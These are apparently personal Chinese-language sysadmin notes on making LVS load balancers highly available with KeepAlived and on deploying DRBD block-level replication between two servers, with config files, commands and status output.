	      的源地址并尝试选择能与该地址通信的本地地址，首要是选择所有的
	      网络接口的子网中外出访问自网中包含该目标IP地址的本地地址。如果
	      没有合适的地址被发现，将选择当前的发送网络接口或其他的有可能接受
	      到该arp回应的网络接口来进行发送。限制了使用本地的VIP地址作为
	      优先的网络接口
	  #+END_EXAMPLE
** LVS高可用之推荐的方案 - KeepAlived
   使用KeepAlived作为LVS的高可用方案是目前最佳的方案，符合运维的
   简单、易用、高效的运维原则。
   http://www.linuxvirtualserver.org/docs/ha/keepalived.html

   KeepAlived解决了LVS的三大问题，
   1. 管理问题
   2. 健康检查问题
   3. 实现高可用
*** 配置KeepAlived
	配置之前，先请空之前手工配置的ipvs。
	
	lb01的KeepAlived配置文件：
	#+BEGIN_EXAMPLE
global_defs {
   notification_email {
     ldc@163.com
   }
   notification_email_from Alexandre.Cassen@firewall.loc
   smtp_server 127.0.0.1
   smtp_connect_timeout 30
   router_id LVS_01
}

vrrp_instance VI_1 {
    state MASTER
    interface eth1
    virtual_router_id 51
    priority 150
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 1111
    }
    virtual_ipaddress {
        192.168.20.250/24
    }
}

vrrp_instance VI_2 {
    state BACKUP
    interface eth1
    virtual_router_id 52
    priority 100
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 1111
    }
    virtual_ipaddress {
        192.168.20.251/24
    }
}

virtual_server 192.168.20.250 80 {
    deplay_loop 6
    lb_algo wrr
    lb_kind DR
    nat_mask 255.255.255.0
    persistence_timeout 50
    protocol TCP

    real_server 192.168.20.152 80 {
        weight 1
        TCP_CHECK {
            connect_timeout 8
            nb_get_retry 3
            delay_before_retry 3
            connect_port 80
        }
    }

    real_server 192.168.20.153 80 {
        weight 1
        TCP_CHECK {
            connect_timeout 8        
            nb_get_retry 3
            delay_before_retry 3
            connect_port 80
        }
    }
}	
	#+END_EXAMPLE

	lb02上的KeepAlived配置文件：
	#+BEGIN_EXAMPLE
global_defs {
   notification_email {
     ldc@163.com
   }
   notification_email_from Alexandre.Cassen@firewall.loc
   smtp_server 127.0.0.1
   smtp_connect_timeout 30
   router_id LVS_02
}

vrrp_instance VI_1 {
    state BACKUP
    interface eth1
    virtual_router_id 51
    priority 100
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 1111
    }
    virtual_ipaddress {
        192.168.20.250/24
    }
}

vrrp_instance VI_2 {
    state MASTER
    interface eth1
    virtual_router_id 52
    priority 150
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 1111
    }
    virtual_ipaddress {
        192.168.20.251/24
    }
}

virtual_server 192.168.20.250 80 {
    deplay_loop 6
    lb_algo wrr
    lb_kind DR
    nat_mask 255.255.255.0
    persistence_timeout 50
    protocol TCP

    real_server 192.168.20.152 80 {
        weight 1
        TCP_CHECK {
            connect_timeout 8
            nb_get_retry 3
            delay_before_retry 3
            connect_port 80
        }
    }

    real_server 192.168.20.153 80 {
        weight 1
        TCP_CHECK {
            connect_timeout 8
            nb_get_retry 3
            delay_before_retry 3
            connect_port 80
        }
    }
}
	#+END_EXAMPLE
** LVS集群分发请求RS不均衡之生产环境实战解决
   生产环境中"ipvsadm -Ln"发现两台RS的负载不均衡，一台有很多请求，一台
   没有。并且没有请求的那台RS经测试服务正常，lo:vip也有。但是就是没有
   请求。

   问题原因：
   #+BEGIN_EXAMPLE
   persistent的原因，persistent回话保持，当client A
   访问网站的时候，LVS把请求分发给了web01，那么以后
   client A再点击的其他操作请求，也会发送给web01这台
   机器。
   #+END_EXAMPLE

   解决办法：
   #+BEGIN_EXAMPLE
   到KeepAlived中，注释掉persistent 10，然后reload
   keepalived服务，然后可以看到以后负载均衡两边都请求均衡了。
   #+END_EXAMPLE

   其他导致负载不均衡的原因可能有：
   1. LVS自身的回话保持参数设置(-p 300，persistent 300)。优化：大公司
      尽量用cookie替代session。
   2. LVS调度算法设置，例如，rr、wrr、wlc、lc算法。
   3. 后端RS节点的回话保持参数，例如，apache的keepalive参数。
   4. 访问量较少的情况下，不均衡的现象更加明显。
   5. 用户发送的请求时间长短，和请求资源多少大小。

   实现回话保持的方案，
   http://oldboy.blog.51cto.com/2561410/1331316
   http://oldboy.blog.51cto.com/2561410/1323468
** LVS故障排错理论及实战
   排查的大体思路就是，要熟悉LVS的工作原理过程，然后根据原理过程
   来排查。例如；
   1. 调度器上LVS调度规则及IP的正确性。
   2. RS节点上VIP绑定和arp抑制的检查。
	  1. 生产处理思路
		 + 对RS绑定的VIP做实时监控，出问题报警或自动处理后报警
		 + 把RS绑定的VIP做成配置文件，如，
           /etc/sysconfig/network-scripts/lo:0
	  2. ARP抑制的配置思路
		 + 如果是单个VIP，那么可以利用stop传参设置0。
		 + 如果RS端有多个VIP绑定，此时，即使是停止VIP绑定也不一定要置0
   3. RS节点上自身提供服务的检查（DR不能端口转换）。
   4. 辅助排除工具有tcpdump、ping等。
	  #+BEGIN_SRC sh
# 在RS上监控来自Director的数据流信息
# tcpdump -nnn -i eth1 -s 10000 -A host 192.168.20.250 and port 80
# tcpdump -i eth0 -nn 'port 52114 and src host 211.103.156.224'
	  #+END_SRC
   5. 负载均衡和反向代理集群的三角形排查理论
	  #+BEGIN_EXAMPLE
	      haproxy
	      /    \
         /      \
        /        \
	  client-----web
	  #+END_EXAMPLE
** LVS负载均衡器下的多台RS代码上线方案思路
   lvs，Nginx、HAproxy，f5等下的集群节点php、java程序，如何上下线。

   集群节点多，上线时希望最大限度的不影响用户体验。

   1. 通过ipvsadm命令下线机器
	  #+BEGIN_SRC sh
	  # ipvsadm -d -t 192.168.20.250:80 -r 192.168.20.152:80
	  #+END_SRC
   2. 通过URL做健康检查，然后，移走健康检查文件。这样，Director会把此
      RS从转发池中移除。

   然后对下线机进行测试。
** LVS性能调优
   1. 关闭iptables，换硬件防火墙
   2. performance tuning base lvs
	  #+BEGIN_EXAMPLE
	  lvs self tuning (ipvsadm timeout (tcp tcpfin udp))
	  # ipvsadm -Ln --timeout
	  Timeout (tcp tcpfin udp): 900 120 300
	  # ipvsadm --set 30 5 60
	  #+END_EXAMPLE
   3. 内核优化
   4. 网卡优化
   5. 硬件优化
* DRBD
** DRBD介绍
*** 什么是DRBD
	Distributed Replicated Block Device（DRBD）是基于块设备在不同的高
	可用服务器之间同步和镜像数据的软件，通过它可以实现网络中的两台服务
	器之间基于块设备级别的实时或异步镜像或同步复制，其实就类似于
	rsync+inotify（sersync）这样的架构项目软件。只不过drbd是基于文件系
	统底层的，及block层级同步，而rsync+inotify（sersync）是在文件系统
	之上的实际物理文件的同步，因此，drbd的效率更高，效果更好。

	提示：上文提到的块设备可以是磁盘分区，LVM逻辑卷，或整块磁盘。DRBD
	同步不能基于目录同步。

	相当于网络的RAID1级别。
*** DRBD工作原理
*** DRBD应用场景
** DRBD的功能说明
   DRBD是工作在磁盘分区、LVM逻辑卷等块设备之上的，它可以通过复制数据块
   的方式把数据从本地磁盘同步到远端的服务器磁盘上。

   DRBD有实时和异步两种同步模式，
   1. 实时同步模式
	  #+BEGIN_EXAMPLE
	  仅仅当数据写入到本地磁盘和远端服务器磁盘都成功返回才算是成功写入。DRBD服务的协议C
	  级别就是这种同步模式，可以防止本地和远端数据丢失和不一致，此种模式是在生产环境中
	  最常用的模式。
	  #+END_EXAMPLE
   2. 异步同步模式
	  #+BEGIN_EXAMPLE
	  当数据写入到本地服务器成功后就返回成功，不管远端服务器是否写入成功。
	  例如，当数据写入到本地服务以及发送到本地的TCP BUFFER后返回成功写入，这是
	  DRBD服务的协议A级别工作模式；当数据写入到本地服务器以及发送到远端节点后，
	  返回成功写入，这是DRBD服务的协议B级别工作模式。
	  #+END_EXAMPLE

   实时同步模式的得到的数据一致性较高，但效率较低。
   异步同步模式得到的数据一致性较差，但效率较高。

*** 一般主节点提供业务访问
	来自官网介绍：数据的访问只能在主节点上。这是文件系统的特性决定的
	（不能多点写入），而不是DRBD的缺点。备节点不能提供数据访问，但是备
	节点还是会实时保持数据同步的，但不能挂载对应的设备及分区，也就是说
	没法同时提供服务。
*** 如何让备节点也可以提供业务访问
	来自官网介绍：尽管有上述文件系统的限制，依然还有方法让备节点提供数
	据访问，就是使用逻辑卷的方式，借助LVM的特性，使用快照的方式达到此
	目的。

	如果使用GFS或OCFS2文系统的话，还可以使用主主模式。
** DRBD的生产应用模式
   单主模式：即主备模式，为典型的带数据同步的高可用性集群方案。
   主主模式：需要采用共享集群文件系统，如GFS和OCFS2。用于需要从2个节点并发访问数据
   的场合，需要特别配置。
** DRBD的3种同步复制协议
   1. 协议A：异步复制协议。本地写成功后立即返回，数据放在TCP send
      buffer中，可能会丢失。
   2. 协议B：半同步复制协议。本地写成功并将数据发送到对方后立即返回，如
      果双机掉电，数据可能会丢失。
   3. 协议C：同步复制协议。本地和对方服务器磁盘都写成功后返回。如果存在
      单点的磁盘损坏和服务器掉电等问题，则数据不会丢失。

   特别提示，
   工作中一般使用C协议。协议不同，将影响数据一致性，以及网络延迟。对于使用A或B
   协议的方案，要考虑数据丢失的风险，当数据写在缓冲区里，没有真正写入到磁盘时，
   系统崩溃会导致数据丢失。有些带电池的硬盘控制器，不但自带缓存而且自带电池，会
   在系统意外断电或者崩溃后将最后的数据写入到磁盘。
** DRBD脑裂及处理
   当心跳线路出现暂时性故障时，会导致两端都各自提升为主。当两端再次连通
   时，需要手工处理这种情况。

   DRBD提供处理脑裂的方式有两种：
   一种为自动处理方式，通过配置文件/etc/drbd.conf
   #+BEGIN_EXAMPLE
net {
	# net: 网络配置相关内容，可以设置是否允许双主节点（allow-two-primaries）等
	after-sb-0pri disconnect;
	after-sb-1pri disconnect;
	after-sb-2pri disconnect
	rr-conflict disconnect;
}
   #+END_EXAMPLE

   一种为手工处理方式，
   1. 在从节点上做如下操作，
	  #+BEGIN_SRC sh
drbdadm secondary data
drbdadm -- --discard-my-data connect data # 放弃本地更新的数据并进行连接
# 此处的data为drbd的一个resource，可以理解一个同步实例
	  #+END_SRC
   2. 在主节点上，通过cat /proc/drbd查看状态，如果不是WFConnection状态，需要再手动连接
	  #+BEGIN_SRC sh
drbdadm connect data
# 此处的data为drbd的一个resource，可以理解一个同步实例
	  #+END_SRC
** 企业级运维场景数据同步的多种方案
*** 文件级别的同步方案
	1. scp/sftp/nc命令可以实现远程数据同步
	2. 搭建ftp/http/svn/nfs/webdev服务器，然后在客户端上也可以把数据同
       步到服务器
	3. 搭建samba文件共享服务，然后在客户端上也可以把数据同步到服务器
	4. 利用rsync/csync2/union等均可实现数据同步（union可实现双向同步，
       csync2可实现多机同步）
	5. 以上文件同步方式如果结合定时任务或者inotify，sersync等功能，可以
       实现定时以及实时的数据同步
	6. 扩展思想：文件级别也可以利用MySQL、mongodb等软件作为容器实现
	7. 扩展思想：程序向两个服务器同时写数据，双写就是一个同步机制
	8. 以上特点：简单、方便、效率和文件系统级别要差一些，但是被同步的节
       点可以提供访问。软件自身同步机制，文件放到数据库，同步到从库，再
       把文件拿出来
** 部署DRBD需求
   | 主机名            | 网卡 | IP                     | 说明   |
   |-------------------+------+------------------------+--------|
   |                   | eth0 | 192.168.19.150（外网） |        |
   | lb01.lavenliu.com | eth1 | 192.168.20.150（内网） | drbd主 |
   |                   | eth2 | 192.168.56.150（心跳） |        |
   |-------------------+------+------------------------+--------|
   | lb02.lavenliu.com | eth0 | 192.168.19.151（外网） | drbd备 |
   |                   | eth1 | 192.168.20.151（内网） |        |
   |                   | eth2 | 192.168.56.151（心跳） |        | 

   /etc/hosts文件，
   #+BEGIN_SRC sh
# 用心跳网IP解析主机名
cat /etc/hosts
192.168.56.150 lb01.lavenliu.com lb01
192.168.56.151 lb02.lavenliu.com lb02
   #+END_SRC

   配置目标：两台服务器分别配置好drbd服务后，实现在lb01机器上/dev/sdb
   分区上写入数据，数据实时同步到lb02机器上，一旦服务器lb01机器宕机或
   硬盘损坏导致数据不可用，lb02机器上的数据此时是lb01机器的一个完整备
   份。当然，不仅是一个完整的备份，还可以瞬间接替宕机的lb01机器，实现
   了数据的异机的实时数据同步，从而达到业务数据高可用无业务影响的目的。
** 开始实施部署DRBD
*** 对硬盘进行分区
	首先，通过parted、fdisk、mkfs.extX、tune2fs等命令，对硬盘进行分区。

	特殊说明：本文为6块600G硬盘做一个大RAID5，在安装系统前做RAID5后，
	又分出了两个虚拟磁盘Disk /dev/sda: 322.1GB(安装系统用)和Disk
	/dev/sdb: 2675.6GB(存储图片数据用)。

	因此，我们需要做的就是对/dev/sdb进行分区，需要分区的具体内容如下：
    | Device    | Mount point   | 预期大小 | 作用                 |
    |-----------+---------------+----------+----------------------|
    | /dev/sdb1 | /data         | 2665G    | 存储全站图片数据     |
    | /dev/sdb2 | meta data分区 | 1G       | 存储drbd同步状态信息 | 

	提示：
	#+BEGIN_EXAMPLE
	1. 这里meta data分区一定不能格式化建立文件系统，交给drbd自己管理
	2. 格式化分好的分区现在不要进行挂载
	3. 经验：生产环境drbd meta data分区一般可设为1-2G。此处的meta data分区也可以不分，
	   和数据分区共用。
	#+END_EXAMPLE

	使用parted对大于2T的硬盘分区，
	#+BEGIN_SRC sh
parted /dev/sdb mklabel gpt yes
parted /dev/sdb mkpart primary ext4 0 100 ignore
parted /dev/sdb mkpart primary linux-swap 101 8192 ignore
parted /dev/sdb mkpart logical ext4 8193 100GB ignore
parted /dev/sdb mkpart logical ext4 101GB 3000GB ignore
parted /dev/sdb quit
	#+END_SRC

	parted与fdisk区别：
	1. 支持gpt分区表，可以管理大于2T的磁盘分区
	2. 分区直接生效，不需要使用命令写入磁盘，
	3. 格式化挂载和fdisk无区别

	最后提醒，两台机器都要执行这样的分区操作，而且，分区大小一样大小。
	最后使用parted查看分区后的结果，
	#+BEGIN_SRC sh
parted /dev/sdb print
	#+END_SRC

	虚拟机测试环境，lb01和lb02分别增加虚拟磁盘/dev/sdb(主节点为2GB，备节点为3GB)
	lb01:
    | Device    | Mount point   | 预期大小 | 作用                   |
    |-----------+---------------+----------+------------------------|
    | /dev/sdb1 | /data         | 1G       | 存储全站图片数据       |
    | /dev/sdb2 | meta data分区 | 1G       | 存储drbd同步的状态信息 | 

	lb02:
    | Device    | Mount point   | 预期大小 | 作用                   |
    |-----------+---------------+----------+------------------------|
    | /dev/sdb1 | /data         | 2G       | 存储全站图片数据       |
    | /dev/sdb2 | meta data分区 | 1G       | 存储drbd同步的状态信息 | 

	使用parted模拟2T以上磁盘分区方式
	#+BEGIN_SRC sh
parted /dev/sdb mklabel gpt yes
parted /dev/sdb mkpart primary ext4 0 1000 ignore
parted /dev/sdb mkpart primary ext4 1001 2000 ignore
parted /dev/sdb print
[root@lb01 ~]# parted /dev/sdb print
Model: VMware, VMware Virtual S (scsi)
Disk /dev/sdb: 2147MB
Sector size (logical/physical): 512B/512B
Partition Table: gpt

Number  Start   End     Size    File system  Name     Flags
 1      17.4kB  1000MB  1000MB               primary
 2      1001MB  2000MB  998MB                primary

# 使用mkfs.ext4格式化
mkfs.ext4 /dev/sdb1
tune2fs -c -1 /dev/sdb1
	#+END_SRC

	lb02分区，
	#+BEGIN_SRC sh
parted /dev/sdb mklabel gpt yes
parted /dev/sdb mkpart primary ext4 0 2000 ignore
parted /dev/sdb mkpart primary ext4 2001 3000 ignore
[root@lb02 ~]# parted /dev/sdb print
Model: VMware, VMware Virtual S (scsi)
Disk /dev/sdb: 3221MB
Sector size (logical/physical): 512B/512B
Partition Table: gpt

Number  Start   End     Size    File system  Name     Flags
 1      17.4kB  2000MB  2000MB               primary
 2      2001MB  3000MB  999MB                primary

# 使用mkfs.ext4格式化
mkfs.ext4 /dev/sdb1
tune2fs -c -1 /dev/sdb1
	#+END_SRC
*** 安装DRBD软件
	需要安装elrepo源，
	#+BEGIN_SRC sh
wget http://www.elrepo.org/elrepo-release-6-6.el6.elrepo.noarch.rpm
rpm -ivh elrepl-release-6-6.el6.elrepo.noarch.rpm
yum search drbd
drbd83-utils.x86_64 : Management utilities for DRBD
drbd84-utils.x86_64 : Management utilities for DRBD
drbdlinks.noarch : A program for managing links into a DRBD shared partition
kmod-drbd83.x86_64 : drbd83 kernel module(s)
kmod-drbd84.x86_64 : drbd84 kernel module(s)
yum install -y drbd kmod-drbd84
	#+END_SRC
*** 加载DRBD内核模块
	#+BEGIN_SRC sh
rpm -ql kmod-drbd84
/etc/depmod.d/kmod-drbd84.conf
/lib/modules/2.6.32-573.el6.x86_64
/lib/modules/2.6.32-573.el6.x86_64/extra
/lib/modules/2.6.32-573.el6.x86_64/extra/drbd84
/lib/modules/2.6.32-573.el6.x86_64/extra/drbd84/drbd.ko # 在2.6.32-573.el6.x86_64目录下
/usr/share/doc/kmod-drbd84-8.4.7
/usr/share/doc/kmod-drbd84-8.4.7/COPYING
/usr/share/doc/kmod-drbd84-8.4.7/ChangeLog
/usr/share/doc/kmod-drbd84-8.4.7/README
lsmod |grep drbd
drbd                  372759  0 
libcrc32c               1246  1 drbd
    #+END_SRC

	如果不能加载，查看当前内核版本"uname -r"是不是与drbd模块目录相同
	（在安装drbd软件包时，发现系统升级了内核包，由原来的
	2.6.32-431.el6.x86_64升级到2.6.32-573.el6.x86_64，所以找不到，这里
	我是使用重启系统的方式解决的，比较简单粗暴，如果当前系统有重要的服
	务运行，肯定不能这样做。）或使用下面的方法
	#+BEGIN_SRC sh
modprobe drbd
echo "modprobe drbd" > /etc/sysconfig/modules/drbd.modules
chmod 755 /etc/sysconfig/modules/drbd.modules
	#+END_SRC
*** 简单配置DRBD(/etc/drbd.conf)
	默认DRBD的配置文件内容很少，只有两行内容，如，
	#+BEGIN_EXAMPLE
# You can find an example in  /usr/share/doc/drbd.../drbd.conf.example

include "drbd.d/global_common.conf";
include "drbd.d/*.res";
	#+END_EXAMPLE
	默认配置文件里说，参考的配置是
	/usr/share/doc/drbd84-utils-8.9.5/drbd.conf.example文件。

	配置文件说明，
	#+BEGIN_EXAMPLE
global {
    usage-count no; # 是否参与DRBD使用者统计；默认是yes
}

## 全局配置项（global）
# 基本上我们可以做的也就是配置usage-count是yes还是no了，usage-count参数其实只是为了
# 让linbit公司收集目前drbd的使用情况。当drbd在安装和升级的时候会通过http协议发信息
# 到linbit公司的服务器上面。

common {
    syncer {
	    rate 10M; # 设置备节点同步时的网络速率最大值，单位是字节
		verify-alg crc32c; # enabled on-line verification at least from sha1, md5 and crc32c
		# 公共配置项（common）
		# 这里的common，指的是drbd所管理的多个资源之间的common。配置项里面主要是配置drbd
		# 所有resource可以设置为相同的参数，比如Protocol，syncer等。
	}
}

# 一个drbd设备（即：/dev/drbdX），叫做一个资源
# 里面包含一个drbd设备的主备节点的相关信息
## 资源配置项（resource）
# resource项中配置的drbd所管理的所有资源，包括节点的IP信息，底层存储设备名称，
# 设备大小，meta信息存放方式，drbd对外提供的设备名等。每一个resource中都需要
# 配置每一个节点信息，而不是单独本节点的信息。并且资源名称只能使用纯ASCII码
# 而且不能使用空白字符用于表示资源名称。实际上，在drbd的整个集群中，每一个节点
# 上面的drbd.conf文件需要是完全一致的。另外，resource还有很多其他的内部配置项：
# primary for drbd1
resource data {
    # 数据同步协议
	# C 两边都写入成功，则返回成功
	# B 写到本地及备节点buffer即返回成功
	# A 写到本地磁盘及TCP send buffer即返回成功
	protocol C;
	disk {
	    on-io-error detach;
	}

    on lb01.lavenliu.com { # 主机名uname -n的输出
	    device    /dev/drbd0; # drbd设备
		disk      /dev/sdb1;  # 与sdb1绑定
		address   192.168.20.150:7788; # 监听及通信的地址
		meta-disk /dev/sdb2[0]; # 存放meta信息
	}
	on lb02.lavenliu.com {
	    device    /dev/drbd0;
		disk      /dev/sdb1;
		address   192.168.20.151:7788;
		meta-disk /dev/sdb2[0];
	}
}
	#+END_EXAMPLE

	一个完整的drbd.conf配置文件（第一版），
	#+BEGIN_SRC sh
[root@lb01 ~]# cat /etc/drbd.conf
global {
    usage-count no;
}

common {
    syncer {
        rate 100M;
        verify-alg crc32c;
    }
}

# primary for drbd1
resource data {
    protocol C;

    disk {
        on-io-error detach;
    }

    on lb01.lavenliu.com {
        device    /dev/drbd0;
        disk      /dev/sdb1;
        address   192.168.20.150:7788;
        meta-disk /dev/sdb2[0];
    }

    on lb02.lavenliu.com {
        device    /dev/drbd0;
        disk      /dev/sdb1;
        address   192.168.20.151:7788;
        meta-disk /dev/sdb2[0];
    }
}
	#+END_SRC

	把该配置文件复制到lb02上一份，两边的配置文件一模一样。
*** 启用drbd资源
	准备了配置文件，接下来就可以启动drbd了。在lb01及lb02上执行。这里仅
	以lb01为例，
	#+BEGIN_SRC sh
# 创建drbd记录信息的metadata分区数据块
drbdadm create-md data # data为配置文件里的名为data的resource
initializing activity log
NOT initializing bitmap
Writing meta data...
New drbd meta data block successfully created.
	#+END_SRC
	
	提示：
	#+BEGIN_EXAMPLE
	也可以不单独创建resource资源名称直接用all，如
	drbdadm create-md all # 其中all表示在drbd.conf里定义的所有资源名称
	#+END_EXAMPLE
*** 启动drbd
	1. 执行启动命令如下
	   #+BEGIN_SRC sh
lb01# drbdadm up all # 等同于/etc/init.d/drbd start
# drbdadm up all相当于执行如下三个命令
drbdadm attach all
drbdadm syncer all
drbdadm connect all
	   #+END_SRC
	2. 查看两边启动drbd状态
	   #+BEGIN_SRC sh
lb01# cat /proc/drbd
version: 8.4.7-1 (api:1/proto:86-101)
GIT-hash: 3a6a769340ef93b1ba2792c6461250790795db49 build by mockbuild@Build64R6, 2016-01-12 13:27:11
 0: cs:Connected ro:Secondary/Secondary ds:Inconsistent/Inconsistent C r-----
    ns:0 nr:0 dw:0 dr:0 al:8 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:976548
或者
lb01# /etc/init.d/drbd status
lb02# cat /proc/drbd
version: 8.4.7-1 (api:1/proto:86-101)
GIT-hash: 3a6a769340ef93b1ba2792c6461250790795db49 build by mockbuild@Build64R6, 2016-01-12 13:27:11
 0: cs:Connected ro:Secondary/Secondary ds:Inconsistent/Inconsistent C r-----
    ns:0 nr:0 dw:0 dr:0 al:16 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:976548
	   #+END_SRC

	   可以看到两边都是“Secondary/Secondary”状态，两端都是从，处于无主
       （primary）状态。
*** 同步drbd数据到对端server，使数据保持一致
**** 指定一个要同步的资源，同步数据到对端
	 说明：
	 1. 如果两端都为空硬盘，可以随意执行操作不需要考虑数据
	 2. 如果两边已有数据，且不一样（要特别注意同步数据的方向，否则可能
        会丢失数据）

     如果没有事先进行数据同步的话，则在一端不能提升为primary状态，下面
     是演示及报错信息，
	 #+BEGIN_SRC sh
drbdadm primary data
0: State change failed: (-2) Need access to UpToDate data
Command 'drbdsetup-84 primary 0' terminated with exit code 17
	 #+END_SRC
**** 一个资源只能在一端执行同步数据到对端的命令
	 #+BEGIN_SRC sh
lb01# drbdadm -- --overwrite-data-of-peer primary data
# 执行完毕，查看drbd状态
[root@lb01 ~]# cat /proc/drbd 
version: 8.4.7-1 (api:1/proto:86-101)
GIT-hash: 3a6a769340ef93b1ba2792c6461250790795db49 build by mockbuild@Build64R6, 2016-01-12 13:27:11
 0: cs:SyncSource ro:Primary/Secondary ds:UpToDate/Inconsistent C r-----
    ns:667648 nr:0 dw:0 dr:668308 al:8 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:308900
	[============>.......] sync'ed: 68.7% (308900/976548)K
	finish: 0:00:07 speed: 39,272 (39,272) K/sec
[root@lb01 ~]# cat /proc/drbd 
version: 8.4.7-1 (api:1/proto:86-101)
GIT-hash: 3a6a769340ef93b1ba2792c6461250790795db49 build by mockbuild@Build64R6, 2016-01-12 13:27:11
 0: cs:SyncSource ro:Primary/Secondary ds:UpToDate/Inconsistent C r-----
    ns:700416 nr:0 dw:0 dr:701076 al:8 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:276132
	[=============>......] sync'ed: 72.0% (276132/976548)K
	finish: 0:00:06 speed: 41,200 (41,200) K/sec
[root@lb01 ~]# cat /proc/drbd 
version: 8.4.7-1 (api:1/proto:86-101)
GIT-hash: 3a6a769340ef93b1ba2792c6461250790795db49 build by mockbuild@Build64R6, 2016-01-12 13:27:11
 0: cs:SyncSource ro:Primary/Secondary ds:UpToDate/Inconsistent C r-----
    ns:729088 nr:0 dw:0 dr:729748 al:8 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:247460
	[=============>......] sync'ed: 74.9% (247460/976548)K
	finish: 0:00:05 speed: 40,504 (40,504) K/sec
[root@lb01 ~]# cat /proc/drbd 
version: 8.4.7-1 (api:1/proto:86-101)
GIT-hash: 3a6a769340ef93b1ba2792c6461250790795db49 build by mockbuild@Build64R6, 2016-01-12 13:27:11
 0: cs:SyncSource ro:Primary/Secondary ds:UpToDate/Inconsistent C r-----
    ns:802816 nr:0 dw:0 dr:803476 al:8 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:173732
	[===============>....] sync'ed: 82.5% (173732/976548)K
	finish: 0:00:04 speed: 40,140 (40,140) K/sec
[root@lb01 ~]# cat /proc/drbd 
version: 8.4.7-1 (api:1/proto:86-101)
GIT-hash: 3a6a769340ef93b1ba2792c6461250790795db49 build by mockbuild@Build64R6, 2016-01-12 13:27:11
 0: cs:SyncSource ro:Primary/Secondary ds:UpToDate/Inconsistent C r-----
    ns:872448 nr:0 dw:0 dr:873108 al:8 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:104100
	[================>...] sync'ed: 89.6% (104100/976548)K
	finish: 0:00:02 speed: 39,828 (39,656) K/sec
[root@lb01 ~]# cat /proc/drbd 
version: 8.4.7-1 (api:1/proto:86-101)
GIT-hash: 3a6a769340ef93b1ba2792c6461250790795db49 build by mockbuild@Build64R6, 2016-01-12 13:27:11
 0: cs:Connected ro:Primary/Secondary ds:UpToDate/UpToDate C r-----
    ns:976546 nr:0 dw:0 dr:977206 al:8 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:0
# 注意：现在lb01的角色已变为 ro:Primary/Secondary 状态了。
# 可以到lb02上查看lb02当前的状态
[root@lb02 ~]# cat /proc/drbd
version: 8.4.7-1 (api:1/proto:86-101)
GIT-hash: 3a6a769340ef93b1ba2792c6461250790795db49 build by mockbuild@Build64R6, 2016-01-12 13:27:11
 0: cs:Connected ro:Secondary/Primary ds:UpToDate/UpToDate C r-----
    ns:0 nr:976546 dw:976546 dr:0 al:16 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:0
# lb02的角色已变为"ro:Secondary/Primary"状态了
	 #+END_SRC

	 这里是把lb01的/dev/sdb1的数据资源同步到lb02的/dev/sdb1分区。注意，
	 这一条命令只在lb01上执行。如果lb02节点磁盘为空数据，如果是数据同
	 步后一致的情况下，可以执行"drbdadm primary data"后会自动开始同步
	 数据。

	 同步状态不正确及解决：
	 1. 如果状态信息为如下内容
		#+BEGIN_SRC sh
# cat /proc/drbd
...
ro:Secondary/Unknown
...
		#+END_SRC
		解决办法：
		+ 检查两台drbd服务器物理网卡网络连接或者IP及主机路由是否正确
		+ 停止iptables防火墙，或者放行drbd同步
		+ Secondary/Unknown还有可能是发生脑裂导致的结果

	 可尝试用下面的命令解决脑裂问题，	  
	 1. 在从节点lb02上做如下操作
		#+BEGIN_SRC sh
drbdadm secondary data
drbdadm -- --discard-my-data connect data # 丢弃本端数据并连接主端
		#+END_SRC
	 2. 在主节点lb01上做如下操作
		#+BEGIN_SRC sh
# 通过cat /proc/drbd查看状态，如果不是WFConnection状态，需要再手动连接
drbdadm connect data
cat /proc/drbd
# drbd处于正常状态的lb01/lb02两端信息应该为如下状态：
		#+END_SRC
*** 故障模拟
**** 停止用于连接的网卡
*** 挂载drbd分区写入数据及同步测试
	在lb01上操作
	#+BEGIN_SRC sh
mkdir /data
mount /dev/drbd0 /data
[root@lb01 ~]# df -h
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda2        15G  3.7G  9.9G  28% /
tmpfs           238M     0  238M   0% /dev/shm
/dev/sda1       190M   53M  128M  29% /boot
/dev/drbd0      923M  1.2M  874M   1% /data

cat /proc/drbd
version: 8.4.7-1 (api:1/proto:86-101)
GIT-hash: 3a6a769340ef93b1ba2792c6461250790795db49 build by mockbuild@Build64R6, 2016-01-12 13:27:11
 0: cs:Connected ro:Primary/Secondary ds:UpToDate/UpToDate C r-----
    ns:0 nr:0 dw:0 dr:660 al:0 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:0 # 注意这一行
# 
echo "hello world" > /data/hello.txt

cat /proc/drbd
version: 8.4.7-1 (api:1/proto:86-101)
GIT-hash: 3a6a769340ef93b1ba2792c6461250790795db49 build by mockbuild@Build64R6, 2016-01-12 13:27:11
 0: cs:Connected ro:Primary/Secondary ds:UpToDate/UpToDate C r-----
    ns:4 nr:0 dw:4 dr:1015 al:1 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:0 # 注意这一行
	#+END_SRC

	备节点此时还不能查看数据，要想查看数据，要先停止从节点的drbd服务，
	然后，挂载/dev/drbd0，可以查看里面是否有hello.txt文件。

	#+BEGIN_SRC sh
lb01# dumpe2fs /dev/sdb1
dumpe2fs 1.41.12 (17-May-2010)
Filesystem volume name:   <none>
Last mounted on:          /mnt
Filesystem UUID:          a528c7ef-0bce-4135-a1b3-c9123f1c60e1
Filesystem magic number:  0xEF53
Filesystem revision #:    1 (dynamic)
Filesystem features:      has_journal ext_attr resize_inode dir_index filetype extent flex_bg sparse_super large_file huge_file uninit_bg dir_nlink extra_isize
Filesystem flags:         signed_directory_hash 
Default mount options:    (none)
Filesystem state:         clean
Errors behavior:          Continue
Filesystem OS type:       Linux
Inode count:              61056
Block count:              244136
Reserved block count:     12206
Free blocks:              235896
Free inodes:              61044
